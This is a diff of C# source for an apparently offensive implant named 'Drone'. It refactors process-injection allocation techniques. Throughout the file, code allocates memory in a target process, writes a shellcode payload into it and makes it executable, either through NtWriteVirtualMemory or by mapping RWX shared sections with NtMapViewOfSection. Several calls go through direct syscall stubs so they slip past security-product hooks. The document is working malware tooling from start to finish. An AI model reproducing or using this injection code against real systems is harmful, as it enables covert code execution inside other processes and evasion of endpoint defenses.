@@ -1,290 +1,205 @@
 ﻿using System;
+using System.Collections.Generic;
 using System.Linq;
-using System.Reflection;
 using System.Diagnostics;
+using System.Runtime.InteropServices;
+
+using Drone.DInvoke.Data;
 
 namespace Drone.DInvoke.Injection
 {
-    /// <summary>
-    /// Base class for allocation techniques.
-    /// </summary>
     public abstract class AllocationTechnique
     {
-        // An array containing a set of PayloadType objects that are supported.
-        protected Type[] supportedPayloads;
+        protected abstract IEnumerable<Type> SupportedPayloads { get; }
 
-        /// <summary>
-        /// Informs objects using this technique whether or not it supports the type of a particular payload.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="Payload">A payload.</param>
-        /// <returns>Whether or not the payload is of a supported type for this strategy.</returns>
-        public abstract bool IsSupportedPayloadType(PayloadType Payload);
+        public virtual bool IsSupportedPayloadType(PayloadType payload)
+            => SupportedPayloads.Contains(payload.GetType());
 
-        /// <summary>
-        /// Internal method for setting the supported payload types. Used in constructors.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        internal abstract void DefineSupportedPayloadTypes();
-
-        /// <summary>
-        /// Allocate the payload to the target process at a specified address.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="Payload">The payload to allocate to the target process.</param>
-        /// <param name="Process">The target process.</param>
-        /// <param name="Address">The address at which to allocate the payload in the target process.</param>
-        /// <returns>True when allocation was successful. Otherwise, throws relevant exceptions.</returns>
-        public virtual IntPtr Allocate(PayloadType Payload, Process Process, IntPtr Address)
-        {
-            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process), Address.GetType() };
-
-            try
-            {
-                // Get delegate to the overload of Allocate that supports the type of payload passed in
-                MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);
-
-                // Dynamically invoke the appropriate Allocate overload
-                return (IntPtr)allocate.Invoke(this, new object[] { Payload, Process, Address });
-            }
-            // If there is no such method
-            catch (ArgumentNullException)
-            {
-                throw new PayloadTypeNotSupported(Payload.GetType());
-            }
-        }
-
-        /// <summary>
-        /// Allocate the payload to the target process.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="Payload">The payload to allocate to the target process.</param>
-        /// <param name="Process">The target process.</param>
-        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public virtual IntPtr Allocate(PayloadType Payload, Process Process)
-        {
-
-            Type[] funcPrototype = new Type[] { Payload.GetType(), typeof(Process) };
-
-            try
-            {
-                // Get delegate to the overload of Allocate that supports the type of payload passed in
-                MethodInfo allocate = this.GetType().GetMethod("Allocate", funcPrototype);
-
-                // Dynamically invoke the appropriate Allocate overload
-                return (IntPtr)allocate.Invoke(this, new object[] { Payload, Process });
-            }
-            // If there is no such method
-            catch (ArgumentNullException)
-            {
-                throw new PayloadTypeNotSupported(Payload.GetType());
-            }
-        }
+        public abstract IntPtr Allocate(PayloadType payload, Process process);
     }
 
-    /// <summary>
-    /// Allocates a payload to a target process using locally-written, remotely-copied shared memory sections.
-    /// </summary>
-    public class SectionMapAlloc : AllocationTechnique
+    public class NtWriteVirtualMemory : AllocationTechnique
     {
-        // Publically accessible options
-
-        public uint localSectionPermissions = Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
-        public uint remoteSectionPermissions = Data.Win32.WinNT.PAGE_EXECUTE_READWRITE;
-        public uint sectionAttributes = Data.Win32.WinNT.SEC_COMMIT;
-
-        /// <summary>
-        /// Default constructor.
-        /// </summary>
-        public SectionMapAlloc()
+        protected override IEnumerable<Type> SupportedPayloads { get; }
+            = new[] { typeof(PICPayload) };
+        
+        public override IntPtr Allocate(PayloadType payload, Process process)
         {
-            DefineSupportedPayloadTypes();
+            var baseAddress = AllocateMemory(payload.Payload, process.Handle);
+            
+            if (!WriteMemory(payload.Payload, process.Handle, baseAddress))
+                throw new Exception("Failed to write process memory");
+            
+            ChangeMemPermission(process.Handle, baseAddress, payload.Payload.Length);
+            
+            return baseAddress;
         }
 
-        /// <summary>
-        /// Constructor allowing options as arguments.
-        /// </summary>
-        public SectionMapAlloc(uint localPerms = Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, uint remotePerms = Data.Win32.WinNT.PAGE_EXECUTE_READWRITE, uint atts = Data.Win32.WinNT.SEC_COMMIT)
+        private IntPtr AllocateMemory(byte[] payload, IntPtr hProcess)
         {
-            DefineSupportedPayloadTypes();
-            localSectionPermissions = localPerms;
-            remoteSectionPermissions = remotePerms;
-            sectionAttributes = atts;
+            var baseAddress = IntPtr.Zero;
+            var regionSize = (IntPtr)payload.Length;
+
+            var result = DynamicInvoke.Native.NtAllocateVirtualMemory(
+                hProcess,
+                ref baseAddress,
+                IntPtr.Zero,
+                ref regionSize,
+                0x1000 | 0x2000,
+                0x04);
+
+            return result;
         }
 
-        /// <summary>
-        /// States whether the payload is supported.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="Payload">Payload that will be allocated.</param>
-        /// <returns></returns>
-        public override bool IsSupportedPayloadType(PayloadType Payload)
+        private bool WriteMemory(byte[] payload, IntPtr hProcess, IntPtr baseAddress)
         {
-            return supportedPayloads.Contains(Payload.GetType());
+            var buffer = Marshal.AllocHGlobal(payload.Length);
+            Marshal.Copy(payload, 0, buffer, payload.Length);
+
+            var result = DynamicInvoke.Native.NtWriteVirtualMemory(
+                hProcess,
+                baseAddress,
+                buffer,
+                (uint)payload.Length);
+
+            return result > 0;
         }
 
-        /// <summary>
-        /// Internal method for setting the supported payload types. Used in constructors.
-        /// Update when new types of payloads are added.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        internal override void DefineSupportedPayloadTypes()
+        private void ChangeMemPermission(IntPtr hProcess, IntPtr baseAddress, int length)
         {
-            //Defines the set of supported payload types.
-            supportedPayloads = new Type[] {
-                typeof(PICPayload)
-            };
+            var regionSize = (IntPtr)length;
+            
+            DynamicInvoke.Native.NtProtectVirtualMemory(
+                hProcess,
+                ref baseAddress,
+                ref regionSize,
+                0x20);
         }
+    }
+    
+    public class NtMapViewOfSection : AllocationTechnique
+    {
+        protected override IEnumerable<Type> SupportedPayloads { get; }
+            = new[] { typeof(PICPayload) };
 
-        /// <summary>
-        /// Allocate the payload to the target process. Handles unknown payload types.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="Payload">The payload to allocate to the target process.</param>
-        /// <param name="Process">The target process.</param>
-        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public override IntPtr Allocate(PayloadType Payload, Process Process)
-        {
-            if (!IsSupportedPayloadType(Payload))
-            {
-                throw new PayloadTypeNotSupported(Payload.GetType());
-            }
-            return Allocate(Payload, Process, IntPtr.Zero);
-        }
+        private const uint LocalSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
+        private const uint RemoteSectionPermissions = Win32.WinNT.PAGE_EXECUTE_READWRITE;
+        private const uint SectionAttributes = Win32.WinNT.SEC_COMMIT;
 
-        /// <summary>
-        /// Allocate the payload in the target process.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="Payload">The PIC payload to allocate to the target process.</param>
-        /// <param name="Process">The target process.</param>
-        /// <param name="PreferredAddress">The preferred address at which to allocate the payload in the target process.</param>
-        /// <returns>Base address of allocated memory within the target process's virtual memory space.</returns>
-        public IntPtr Allocate(PICPayload Payload, Process Process, IntPtr PreferredAddress)
+        public override IntPtr Allocate(PayloadType payload, Process process)
         {
             // Get a convenient handle for the target process.
-            IntPtr procHandle = Process.Handle;
+            var hProcess = process.Handle;
+            
+            // Get handle to current process
+            var hSelf = Process.GetCurrentProcess().Handle;
 
             // Create a section to hold our payload
-            IntPtr sectionAddress = CreateSection((uint)Payload.Payload.Length, sectionAttributes);
+            var sectionAddress = CreateSection((uint)payload.Payload.Length, SectionAttributes);
 
             // Map a view of the section into our current process with RW permissions
-            SectionDetails details = MapSection(Process.GetCurrentProcess().Handle, sectionAddress,
-                localSectionPermissions, IntPtr.Zero, Convert.ToUInt32(Payload.Payload.Length));
+            var details = MapSection(
+                hSelf,
+                sectionAddress,
+                LocalSectionPermissions,
+                IntPtr.Zero,
+                Convert.ToUInt32(payload.Payload.Length));
 
             // Copy the shellcode to the local view
-            System.Runtime.InteropServices.Marshal.Copy(Payload.Payload, 0, details.baseAddr, Payload.Payload.Length);
+            Marshal.Copy(payload.Payload, 0, details.BaseAddress, payload.Payload.Length);
 
             // Now that we are done with the mapped view in our own process, unmap it
-            Data.Native.NTSTATUS result = UnmapSection(Process.GetCurrentProcess().Handle, details.baseAddr);
+            var result = UnmapSection(
+                hSelf,
+                details.BaseAddress);
 
             // Now, map a view of the section to other process. It should already hold the payload.
-
-            SectionDetails newDetails;
-
-            if (PreferredAddress != IntPtr.Zero)
-            {
-                // Attempt to allocate at a preferred address. May not end up exactly at the specified location.
-                // Refer to MSDN documentation on ZwMapViewOfSection for details.
-                newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, PreferredAddress, (ulong)Payload.Payload.Length);
-            }
-            else
-            {
-                newDetails = MapSection(procHandle, sectionAddress, remoteSectionPermissions, IntPtr.Zero, (ulong)Payload.Payload.Length);
-            }
-            return newDetails.baseAddr;
+            var newDetails = MapSection(
+                hProcess,
+                sectionAddress,
+                RemoteSectionPermissions,
+                IntPtr.Zero,
+                (ulong)payload.Payload.Length);
+            
+            return newDetails.BaseAddress;
         }
 
-        /// <summary>
-        /// Creates a new Section.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="size">Max size of the Section.</param>
-        /// <param name="allocationAttributes">Section attributes (eg. Win32.WinNT.SEC_COMMIT).</param>
-        /// <returns></returns>
         private static IntPtr CreateSection(ulong size, uint allocationAttributes)
         {
             // Create a pointer for the section handle
-            IntPtr SectionHandle = new IntPtr();
-            ulong maxSize = size;
+            var sectionHandle = new IntPtr();
+            var maxSize = size;
 
-            Data.Native.NTSTATUS result = DynamicInvoke.Native.NtCreateSection(
-                ref SectionHandle,
+            var stub = DynamicInvoke.Generic.GetSyscallStub("NtCreateSection");
+            var ntCreateSection = (DynamicInvoke.Native.Delegates.NtCreateSection)Marshal.GetDelegateForFunctionPointer(
+                stub,
+                typeof(DynamicInvoke.Native.Delegates.NtCreateSection));
+
+            var result = ntCreateSection(
+                ref sectionHandle,
                 0x10000000,
                 IntPtr.Zero,
                 ref maxSize,
-                Data.Win32.WinNT.PAGE_EXECUTE_READWRITE,
+                Win32.WinNT.PAGE_EXECUTE_READWRITE,
                 allocationAttributes,
-                IntPtr.Zero
-            );
+                IntPtr.Zero);
+
             // Perform error checking on the result
-            if (result < 0)
-            {
-                return IntPtr.Zero;
-            }
-            return SectionHandle;
+            return result < 0 ? IntPtr.Zero : sectionHandle;
         }
 
-        /// <summary>
-        /// Maps a view of a section to the target process.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="procHandle">Handle the process that the section will be mapped to.</param>
-        /// <param name="sectionHandle">Handle to the section.</param>
-        /// <param name="protection">What permissions to use on the view.</param>
-        /// <param name="addr">Optional parameter to specify the address of where to map the view.</param>
-        /// <param name="sizeData">Size of the view to map. Must be smaller than the max Section size.</param>
-        /// <returns>A struct containing address and size of the mapped view.</returns>
-        public static SectionDetails MapSection(IntPtr procHandle, IntPtr sectionHandle, uint protection, IntPtr addr, ulong sizeData)
+        private static SectionDetails MapSection(IntPtr hProcess, IntPtr hSection, uint protection, IntPtr addr, ulong sizeData)
         {
             // Copied so that they may be passed by reference but the original value preserved
-            IntPtr baseAddr = addr;
-            ulong size = sizeData;
+            var baseAddr = addr;
+            var size = sizeData;
 
-            uint disp = 2;
-            uint alloc = 0;
-
-            // Returns an NTSTATUS value
-            Data.Native.NTSTATUS result = DynamicInvoke.Native.NtMapViewOfSection(
-                sectionHandle, procHandle,
+            const uint disp = 2;
+            const uint alloc = 0;
+            
+            var stub = DynamicInvoke.Generic.GetSyscallStub("NtMapViewOfSection");
+            var ntMapViewOfSection = (DynamicInvoke.Native.Delegates.NtMapViewOfSection)Marshal.GetDelegateForFunctionPointer(
+                stub,
+                typeof(DynamicInvoke.Native.Delegates.NtMapViewOfSection));
+            
+            var result = ntMapViewOfSection(
+                hSection, 
+                hProcess,
                 ref baseAddr,
-                IntPtr.Zero, IntPtr.Zero, IntPtr.Zero,
-                ref size, disp, alloc,
-                protection
-            );
+                IntPtr.Zero, 
+                IntPtr.Zero, 
+                IntPtr.Zero,
+                ref size, 
+                disp, 
+                alloc,
+                protection);
 
             // Create a struct to hold the results.
-            SectionDetails details = new SectionDetails(baseAddr, sizeData);
+            var details = new SectionDetails(baseAddr, sizeData);
 
             return details;
         }
 
-
-        /// <summary>
-        /// Holds the data returned from NtMapViewOfSection.
-        /// </summary>
-        public struct SectionDetails
+        private readonly struct SectionDetails
         {
-            public IntPtr baseAddr;
-            public ulong size;
+            public readonly IntPtr BaseAddress;
+            public readonly ulong Size;
 
-            public SectionDetails(IntPtr addr, ulong sizeData)
+            public SectionDetails(IntPtr address, ulong size)
             {
-                baseAddr = addr;
-                size = sizeData;
+                BaseAddress = address;
+                Size = size;
             }
         }
-
-        /// <summary>
-        /// Unmaps a view of a section from a process.
-        /// </summary>
-        /// <author>The Wover (@TheRealWover)</author>
-        /// <param name="hProc">Process to which the view has been mapped.</param>
-        /// <param name="baseAddr">Address of the view (relative to the target process)</param>
-        /// <returns></returns>
-        public static Data.Native.NTSTATUS UnmapSection(IntPtr hProc, IntPtr baseAddr)
+        
+        private static Native.NTSTATUS UnmapSection(IntPtr hProcess, IntPtr baseAddress)
         {
-            return DynamicInvoke.Native.NtUnmapViewOfSection(hProc, baseAddr);
+            var stub = DynamicInvoke.Generic.GetSyscallStub("NtUnmapViewOfSection");
+            var ntUnmapViewOfSection = (DynamicInvoke.Native.Delegates.NtUnmapViewOfSection)Marshal.GetDelegateForFunctionPointer(
+                stub,
+                typeof(DynamicInvoke.Native.Delegates.NtUnmapViewOfSection));
+            
+            return ntUnmapViewOfSection(hProcess, baseAddress);
         }
     }
 }
